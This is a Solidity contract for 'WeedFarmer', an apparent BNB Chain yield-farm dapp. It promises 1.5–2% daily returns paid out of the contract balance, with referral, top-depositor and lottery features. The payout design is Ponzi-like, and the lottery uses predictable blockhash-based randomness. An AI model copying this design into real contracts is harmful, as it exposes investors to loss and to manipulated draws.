/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

/**
********* CryptoFortuneGames: WeedFarmer *************
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⢈⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠉⡇⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⡇⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⡗⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠧⠀⡇⠀⠼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⣦⣟⠹⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡄⠀⡇⠀⢠⣷⠀⠀⠀⠀⠀⠀⠀⢀⣠⡶⠋⡿⣾⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢹⣬⡢⡀⠈⠗⣄⠀⠀⠀⠀⠀⠀⣸⡟⠀⣯⠀⠉⡇⠀⠀⠀⠀⠀⢀⣴⠿⠁⣠⠊⣴⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⣄⠙⢄⠀⠘⠷⣄⠀⠀⠀⠀⢸⡟⠀⡇⠀⠸⡇⠀⠀⠀⠀⣠⠿⠁⢀⡔⠁⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠈⠳⡀⠀⠙⣶⡀⠀⠀⢸⡇⠀⣇⠀⠸⡟⠀⠀⢠⣾⠃⠀⣠⠊⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡖⠀⠘⢦⠀⠈⠹⣄⠀⠸⣧⡀⣇⠀⣼⠇⠀⣠⠏⠁⢀⠜⠁⠀⣺⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠱⣄⠀⠙⣆⢀⣷⠀⣿⠀⣼⠄⣰⠋⠀⡠⠋⠀⣤⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⣄⠈⢢⡀⠸⣯⢹⡀⡏⢀⣟⡴⠇⢀⠞⠀⢠⣶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠐⠶⢶⣶⣶⣶⡗⠒⠶⠖⠲⢶⡤⣄⣀⡈⢓⣦⣀⠑⢄⠈⣿⠇⠀⢈⡿⠁⡰⠃⣠⡴⠋⠀⣀⣀⣠⣤⠤⠴⡶⠴⢶⢤⣤⣤⣤⡤⠄
⠀⠀⠀⠈⠛⠶⣏⣉⠀⠒⠢⡤⢀⣀⡈⠉⠛⠟⠿⣦⣌⠣⡈⣇⠀⣸⢡⠎⣠⣴⡯⠶⠖⠋⠉⢀⣀⠠⠤⠐⠒⠀⣱⡤⠟⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠓⠲⠯⣀⣀⣀⠉⠉⠐⠒⠤⠬⣉⠳⢬⣹⣤⣟⣥⠖⢋⡉⠤⠔⠒⠊⠉⣁⣀⣀⣱⡦⠞⠛⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠓⠒⠒⣶⣤⠶⡚⢿⣿⣿⠷⠤⢤⣤⡤⠤⠴⠖⠒⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⣏⡩⠚⢩⡿⠋⣿⠈⢳⣆⠒⢍⡙⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡧⡖⣁⣤⠖⠉⠀⠀⣿⠀⠀⠈⠳⢤⣌⠓⣤⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠈⠙⠛⠺⠿⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀
**/
//SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract WeedFarmer {
	using SafeMath for uint256;

	bool private contractStarted;              
	uint256 public PROJECT_FEE = 50;  // 5%
	uint256 public REFERRAL_PERCENT = 50;  // 5%
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public CUTOFF_STEP = 168 * 60 * 60;
	uint256 public WITHDRAW_COOLDOWN = 120 * 60 * 60;
	uint256 public COMPOUND_COOLDOWN = 120 * 60 * 60;
    uint256 public REINVEST_BONUS = 0;
	uint256 public MAX_WITHDRAW = 1000 ether;
	uint256 public WALLET_LIMIT = 150 ether;  

    uint256 public PERCENTAGE_BONUS_STARTTIME = 0;
	uint256 public PERCENTAGE_BONUS_PLAN_1 = 0;
    uint256 public PERCENTAGE_BONUS_PLAN_2 = 0;
    uint256 public PERCENTAGE_BONUS_PLAN_3 = 0;
    uint256 public PERCENTAGE_BONUS_PLAN_4 = 0;

	uint256 public totalInvested;
	uint256 public totalReInvested;
	uint256 public totalRefBonus;
	uint256 public totalInvestorCount;

    struct Plan {
        uint256 time;
        uint256 percent;
        uint256 mininvest;
        uint256 maxinvest;

        uint256 planTotalInvestorCount;
        uint256 planTotalInvestments;
        uint256 planTotalReInvestorCount;
        uint256 planTotalReInvestments;
        
        bool planActivated;
    }

    uint8[] public pool_bonuses;
    uint256 public pool_cycle = 1;
    uint256 public pool_balance;
    uint256 public max_pool_balance = 5 ether; 
    
	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
		bool reinvested;
	}
    
    Plan[] internal plans;

	struct User {
		Deposit[] deposits;
		mapping (uint8 => uint256) checkpoints; 
		uint256 cutoff;
		uint256 totalInvested;
		address referrer;
		uint256 referralsCount;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		uint256 reinvested;
		uint256 totalDepositAmount;
        uint256 lottery_rewards;
	}

	bool public TOP_DEPOSIT_ACTIVATED;
	uint256 public TOP_DEPOSIT_START_TIME;
	uint256 public TOP_DEPOSIT_STEP = 86400; // 24 hrs

    /**Lotery **/

    bool public LOTTERY_ACTIVATED;
    uint256 public LOTTERY_START_TIME;
    uint256 public LOTTERY_STEP = 86400; // 24 hrs
    uint256 public LOTTERY_TICKET_PRICE = 20 * 1e15; //  0.02BNB
    uint256 public MAX_LOTTERY_TICKET = 20;
    uint256 public MAX_LOTTERY_PARTICIPANTS = 1000;
    uint256 public MAX_LOTTERY_POOL_PER_ROUND = 10 ether;
    uint256 public lotteryRound = 0;
    uint256 public currentPot = 0;
    uint256 public participants = 0;
    uint256 public totalTickets = 0;

    struct LotteryHistory {
        uint256 round;
        address winnerAddress;
        uint256 pot;
        uint256 totalLotteryParticipants;
        uint256 totalLotteryTickets;
    }

    LotteryHistory[] internal lotteryHistory;

	mapping(uint8 => address) public pool_top; 
	mapping(uint256 => mapping(address => uint256)) public ticketOwners; 
    mapping(uint256 => mapping(uint256 => address)) public participantAdresses; 
    mapping(uint256 => mapping(address => uint256)) public pool_users_deposits_sum; 
    event LotteryWinner(address indexed investor, uint256 pot, uint256 indexed round);
    event PoolPayout(address indexed addr, uint256 amount);

    struct TopDeposit {
      address pool_top_addr;
      uint8 plan;
    }

    mapping(uint8 => TopDeposit) public topDepositPool; 
	mapping (address => User) internal users;

    address payable private treasury;
	address public owner;
    uint public startTime = 1670356800; // https://www.unixtimestamp.com/   fixded Tue Dec 06 2022 20:00:00 GMT
	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event NewDepositLottery(address indexed user, uint256 amount);
	event ReinvestedDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable _treasury) {
        owner = msg.sender;
        treasury = _treasury;

        plans.push(Plan(200, 20,  2 * 1e17, 50 ether, 0, 0, 0, 0, true));
        plans.push(Plan(150, 15,  2 * 1e17, 50 ether, 0, 0, 0, 0, true));
        plans.push(Plan(90, 15,  2 * 1e17, 50 ether, 0, 0, 0, 0, true));

		pool_bonuses.push(10);
        pool_bonuses.push(9);
        pool_bonuses.push(8);
        pool_bonuses.push(7);
        pool_bonuses.push(6);
        pool_bonuses.push(5);
        pool_bonuses.push(4);
        pool_bonuses.push(3);
        pool_bonuses.push(2);
        pool_bonuses.push(1);
	}

	function invest(address referrer, uint8 plan) public payable{
		require(block.timestamp > startTime);
        require(contractStarted, "Contract is not Started.");
        require(plan < plans.length, "Invalid Plan.");
        require(msg.value >= plans[plan].mininvest, "Less than minimum amount required for the selected Plan.");
        require(msg.value <= plans[plan].maxinvest, "More than maximum amount required for the selected Plan.");
		require(plans[plan].planActivated, "Plan selected is disabled");
        require(getUserActiveProjectInvestments(msg.sender).add(msg.value) <= WALLET_LIMIT, "Max wallet deposit limit reached.");

        emit FeePayed(msg.sender, payFees(msg.value));

		User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 amount = msg.value.mul(REFERRAL_PERCENT).div(PERCENTS_DIVIDER);
                users[upline].bonus = users[upline].bonus.add(amount);
                users[upline].totalBonus = users[upline].totalBonus.add(amount);
                totalRefBonus = totalRefBonus.add(amount);
                emit RefBonus(upline, msg.sender, amount);
            }
        }

  		if (user.deposits.length == 0) {
            totalInvestorCount = totalInvestorCount.add(1);
			user.checkpoints[plan] = block.timestamp;
			user.cutoff = block.timestamp.add(CUTOFF_STEP);
			emit Newbie(msg.sender);
		}		

		user.deposits.push(Deposit(plan, msg.value, block.timestamp, false));

		user.totalInvested = user.totalInvested.add(msg.value);
		totalInvested = totalInvested.add(msg.value);        

	
		plans[plan].planTotalInvestorCount = plans[plan].planTotalInvestorCount.add(1);
		plans[plan].planTotalInvestments = plans[plan].planTotalInvestments.add(msg.value);

        if (TOP_DEPOSIT_ACTIVATED) {
            if(getTimeStamp().sub(TOP_DEPOSIT_START_TIME) >=  TOP_DEPOSIT_STEP) {
                _drawPool();
            }
            _topDeposits(msg.sender, msg.value, plan);
        }

        if (LOTTERY_ACTIVATED) {
            if(getTimeStamp().sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants >= MAX_LOTTERY_PARTICIPANTS || currentPot >= MAX_LOTTERY_POOL_PER_ROUND){
                chooseWinner();
            }
		}

		emit NewDeposit(msg.sender, plan, msg.value);
	}	

	function withdraw() public {
		require(block.timestamp > startTime);
        require(contractStarted, "Contract is not Started.");
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;

		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}

        for(uint8 i = 0; i < plans.length; i++){

            if(user.checkpoints[i].add(WITHDRAW_COOLDOWN) > block.timestamp){
               revert("Withdrawals can only be made after withdraw cooldown.");
            }

		    user.checkpoints[i] = block.timestamp; /** global withdraw will reset checkpoints on all plans **/
        }

        /** Excess dividends are sent back to the user's account available for the next withdrawal. **/
        if(totalAmount > MAX_WITHDRAW) {
            user.bonus = totalAmount.sub(MAX_WITHDRAW);
            totalAmount = MAX_WITHDRAW;
        }

        if(TOP_DEPOSIT_ACTIVATED && getTimeStamp().sub(TOP_DEPOSIT_START_TIME) >=  TOP_DEPOSIT_STEP) {
		   _drawPool();
        }

        if (LOTTERY_ACTIVATED) {
            if(getTimeStamp().sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants >= MAX_LOTTERY_PARTICIPANTS || currentPot >= MAX_LOTTERY_POOL_PER_ROUND){
                chooseWinner();
            }
		}
        
        user.cutoff = block.timestamp.add(CUTOFF_STEP); /** global withdraw will also reset CUTOFF **/
        uint256 fee = payFees(totalAmount);
        totalAmount = totalAmount.sub(fee);
        user.withdrawn = user.withdrawn.add(totalAmount);       
        payable(address(msg.sender)).transfer(totalAmount);
        emit FeePayed(msg.sender, fee);        
		emit Withdrawn(msg.sender, totalAmount);
	}
	
	function payFees(uint256 amounterc) internal returns(uint256) {
		uint256 fee = amounterc.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		treasury.transfer(fee);
        return fee;
    }
    
	function getUserDividends(address userAddress, int8 plan) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		uint256 endPoint = block.timestamp < user.cutoff ? block.timestamp : user.cutoff;

		for (uint256 i = 0; i < user.deposits.length; i++) {
		    if(plan > -1){
		        if(user.deposits[i].plan != uint8(plan)){
		            continue;
		        }
		    }
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			/** check if plan is not yet finished. **/
			if (user.checkpoints[user.deposits[i].plan] < finish) {

			    uint256 percent = plans[user.deposits[i].plan].percent;
			    if(user.deposits[i].start >= PERCENTAGE_BONUS_STARTTIME){
                    if(user.deposits[i].plan == 0){
                        percent = percent.add(PERCENTAGE_BONUS_PLAN_1);
                    }else if(user.deposits[i].plan == 1){
                        percent = percent.add(PERCENTAGE_BONUS_PLAN_2);
                    }else if(user.deposits[i].plan == 2){
                        percent = percent.add(PERCENTAGE_BONUS_PLAN_3);
                    }else if(user.deposits[i].plan == 3){
                        percent = percent.add(PERCENTAGE_BONUS_PLAN_4);
                    }
			    }

				uint256 share = user.deposits[i].amount.mul(percent).div(PERCENTS_DIVIDER);

				uint256 from = user.deposits[i].start > user.checkpoints[user.deposits[i].plan] ? user.deposits[i].start : user.checkpoints[user.deposits[i].plan];
				/** uint256 to = finish < block.timestamp ? finish : block.timestamp; **/
				uint256 to = finish < endPoint ? finish : endPoint;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}	

    function _topDeposits(address _addr, uint256 _amount, uint8 _plan) private {
        if(_addr == address(0)) return;
		
        if(pool_balance.add(_amount) > max_pool_balance){   
            pool_balance += max_pool_balance.sub(pool_balance);
        }else{
            pool_balance += _amount;
        }

        pool_users_deposits_sum[pool_cycle][_addr] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(topDepositPool[i].pool_top_addr == _addr) break;

            if(topDepositPool[i].pool_top_addr == address(0)) {
                topDepositPool[i].pool_top_addr = _addr;
                topDepositPool[i].plan = _plan;
                break;
            }

            if(pool_users_deposits_sum[pool_cycle][_addr] > pool_users_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(topDepositPool[j].pool_top_addr == _addr) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            topDepositPool[k].pool_top_addr = topDepositPool[k + 1].pool_top_addr;
                            topDepositPool[k].plan = topDepositPool[k + 1].plan;
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length.sub(1)); j > i; j--) {
                    topDepositPool[j].pool_top_addr = topDepositPool[j - 1].pool_top_addr;
                    topDepositPool[j].plan = topDepositPool[j - 1].plan;
                }
                topDepositPool[i].pool_top_addr = _addr;
                topDepositPool[i].plan = _plan;
                break;
            }
        }
    }

	function _drawPool() private {
        pool_cycle++;
        TOP_DEPOSIT_START_TIME = getTimeStamp();
        uint256 draw_amount = pool_balance;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(topDepositPool[i].pool_top_addr == address(0)) break;
            User storage user = users[topDepositPool[i].pool_top_addr];
            uint8 plan =  topDepositPool[i].plan;
            uint256 win = draw_amount.mul(pool_bonuses[i]) / 100;        
            uint8 safety = 0;
            for (uint8 j = 0; j < user.deposits.length; j++) {            
              if(user.deposits[j].plan == plan ){ //add reward to first matching plan
                user.deposits[j].amount = user.deposits[j].amount.add(win);
                safety = 1;
              }
            }
            
            user.totalInvested = user.totalInvested.add(win);
		    totalInvested = totalInvested.add(win);
            pool_balance -= win;
            emit PoolPayout(topDepositPool[i].pool_top_addr, win);
        }

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            topDepositPool[i].pool_top_addr = address(0);
            topDepositPool[i].plan = 0;
        }
    }  

    //lotery

    function chooseWinner() private {
        if(participants > 0){
            uint256[] memory init_range = new uint256[](participants);
            uint256[] memory end_range = new uint256[](participants);

            uint256 last_range = 0;

            for(uint256 i = 0; i < participants; i++){
                uint256 range0 = last_range.add(1);
                uint256 range1 = range0.add(ticketOwners[lotteryRound][participantAdresses[lotteryRound][i]].div(1e18));

                init_range[i] = range0;
                end_range[i] = range1;
                last_range = range1;
            }

            uint256 random = _getRandom().mod(last_range).add(1);

            for(uint256 i = 0; i < participants; i++){
                if((random >= init_range[i]) && (random <= end_range[i])){

                    address winnerAddress = participantAdresses[lotteryRound][i];
                    User storage user = users[winnerAddress];
                    uint256 rewardAmount = currentPot.sub(payFees(currentPot));
                    user.lottery_rewards = user.lottery_rewards.add(rewardAmount);
                    address payable receiver = payable(winnerAddress);
                    receiver.transfer(rewardAmount);
                    lotteryHistory.push(LotteryHistory(lotteryRound, winnerAddress, rewardAmount, participants, totalTickets));
                    emit LotteryWinner(winnerAddress, rewardAmount, lotteryRound);

                    currentPot = 0;
                    participants = 0;
                    totalTickets = 0;
                    LOTTERY_START_TIME = getTimeStamp();
                    lotteryRound++;
                    break;
                }
            }
        }else{
            LOTTERY_START_TIME = getTimeStamp();
        }
    }

    function _getRandom() private view returns(uint256){
        bytes32 _blockhash = blockhash(block.number-1);
        return uint256(keccak256(abi.encode(_blockhash, getTimeStamp(), currentPot, block.difficulty, 259200000000, getContractBalance())));
    }

    function _buyTickets() public payable {
        require(contractStarted, "Contract is not Started.");
        require(msg.value != 0, "zero purchase amount");
        uint256 amount = msg.value;
        uint256 userTickets = ticketOwners[lotteryRound][msg.sender];
        uint256 numTickets = amount.div(LOTTERY_TICKET_PRICE);

        if(userTickets == 0) {
            participantAdresses[lotteryRound][participants] = msg.sender;

            if(numTickets > 0){
              participants = participants.add(1);
            }
        }

        if (userTickets.add(numTickets) > MAX_LOTTERY_TICKET) {
            numTickets = MAX_LOTTERY_TICKET.sub(userTickets);
        }

        ticketOwners[lotteryRound][msg.sender] = userTickets.add(numTickets);
        uint256 ticketAmount = amount.sub(payFees(amount));
        emit NewDepositLottery(msg.sender, ticketAmount);

        if(currentPot.add(ticketAmount) > MAX_LOTTERY_POOL_PER_ROUND){
            currentPot += MAX_LOTTERY_POOL_PER_ROUND.sub(currentPot);
        }
        else{
            currentPot += ticketAmount;
        }

        totalTickets = totalTickets.add(numTickets);
    }

    function getLotteryInfo() public view returns (uint256 lotteryStartTime,  uint256 lotteryStep, uint256 lotteryCurrentPot,
        uint256 lotteryParticipants, uint256 maxLotteryParticipants, uint256 totalLotteryTickets, uint256 lotteryTicketPrice,
        uint256 maxLotteryTicket, uint256 round){
          lotteryStartTime = LOTTERY_START_TIME;
          lotteryStep = LOTTERY_STEP;
          lotteryTicketPrice = LOTTERY_TICKET_PRICE;
          maxLotteryParticipants = MAX_LOTTERY_PARTICIPANTS;
          round = lotteryRound;
          lotteryCurrentPot = currentPot;
          lotteryParticipants = participants;
          totalLotteryTickets = totalTickets;
          maxLotteryTicket = MAX_LOTTERY_TICKET;
      }

    function getLotteryHistory(uint256 index) public view returns(uint256 round, address winnerAddress, uint256 pot,
        uint256 totalLotteryParticipants, uint256 totalLotteryTickets) {
          round = lotteryHistory[index].round;
          winnerAddress = lotteryHistory[index].winnerAddress;
          pot = lotteryHistory[index].pot;
          totalLotteryParticipants = lotteryHistory[index].totalLotteryParticipants;
          totalLotteryTickets = lotteryHistory[index].totalLotteryTickets;
      }

    // Lottery
     
	function getUserActiveProjectInvestments(address userAddress) public view returns (uint256){
	    uint256 totalAmount;

		/** get total active investments in all plans. **/
        for(uint8 i = 0; i < plans.length; i++){
              totalAmount = totalAmount.add(getUserActiveInvestments(userAddress, i));  
        }
        
	    return totalAmount;
	}

	function getUserActiveInvestments(address userAddress, uint8 plan) public view returns (uint256){
	    User storage user = users[userAddress];
	    uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {

	        if(user.deposits[i].plan != uint8(plan)){
	            continue;
	        }

			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			if (user.checkpoints[uint8(plan)] < finish) {
			    /** sum of all unfinished deposits from plan **/
				totalAmount = totalAmount.add(user.deposits[i].amount);
			}
		}
	    return totalAmount;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent, uint256 minimumInvestment, uint256 maximumInvestment,
	  uint256 planTotalInvestorCount, uint256 planTotalInvestments , uint256 planTotalReInvestorCount, uint256 planTotalReInvestments, bool planActivated) {
		time = plans[plan].time;
		percent = plans[plan].percent;
		minimumInvestment = plans[plan].mininvest;
		maximumInvestment = plans[plan].maxinvest;
		planTotalInvestorCount = plans[plan].planTotalInvestorCount;
		planTotalInvestments = plans[plan].planTotalInvestments;
		planTotalReInvestorCount = plans[plan].planTotalReInvestorCount;
		planTotalReInvestments = plans[plan].planTotalReInvestments;
		planActivated = plans[plan].planActivated;
	}

	function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
	    return getUserDividends(userAddress, -1);
	}

	function getUserCutoff(address userAddress) public view returns (uint256) {
      return users[userAddress].cutoff;
    }

	function getUserLotteryRewars(address userAddress) public view returns (uint256) {
		return users[userAddress].lottery_rewards;
	}

    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress, uint8 plan) public view returns(uint256) {
		return users[userAddress].checkpoints[plan];
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

    function getUserTotalReferrals(address userAddress) public view returns (uint256){
        return users[userAddress].referralsCount;
    }

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
	    return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 userTotalInvested, uint256 start, uint256 finish, bool reinvested, uint256 lottery_rewards) {
	    User storage user = users[userAddress];
		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
        userTotalInvested = user.totalInvested;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
		reinvested = user.deposits[index].reinvested;
        lottery_rewards = user.lottery_rewards;
	}

    function poolTopInfo() view external returns(address[10] memory addrs, uint256[10] memory deps) { // top 10 deposits
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(topDepositPool[i].pool_top_addr == address(0)) break;

            addrs[i] = topDepositPool[i].pool_top_addr;
            deps[i] = pool_users_deposits_sum[pool_cycle][topDepositPool[i].pool_top_addr];
        }
    }

    function poolTopInfo2(uint8 index) view external returns(address addrs, uint256 deps) { 
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(i == index) {
                addrs = topDepositPool[i].pool_top_addr;
                deps = pool_users_deposits_sum[pool_cycle][topDepositPool[i].pool_top_addr];
            }
        }
        return (addrs, deps);
    }

    function getSiteInfo() public view returns (uint256 _totalInvested, uint256 _totalBonus) {
        return (totalInvested, totalRefBonus);
    }

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function getBlockTimeStamp() public view returns (uint256) {
	    return block.timestamp;
	}

	function getPlansLength() public view returns (uint256) {
	    return plans.length;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	function runEvents() external {
        require(contractStarted, "Contract is not Started.");        
        require(msg.sender == owner);
        if (TOP_DEPOSIT_ACTIVATED) {
            if(getTimeStamp().sub(TOP_DEPOSIT_START_TIME) >=  TOP_DEPOSIT_STEP) {
                _drawPool();
            }
		}

        if (LOTTERY_ACTIVATED) {
            if(getTimeStamp().sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants >= MAX_LOTTERY_PARTICIPANTS || currentPot >= MAX_LOTTERY_POOL_PER_ROUND){
                chooseWinner();
            }
		}
    }	

	function activateLaunch() external {
        require(msg.sender == owner, "Admin use only");
	    if(contractStarted == false)
         {
          contractStarted = true;
	      TOP_DEPOSIT_ACTIVATED = true;
          LOTTERY_ACTIVATED = true;
	      TOP_DEPOSIT_START_TIME = block.timestamp;	
         }    
    }     

    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only");  
        require(!isContract(value));     
        owner = value;
    }        

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}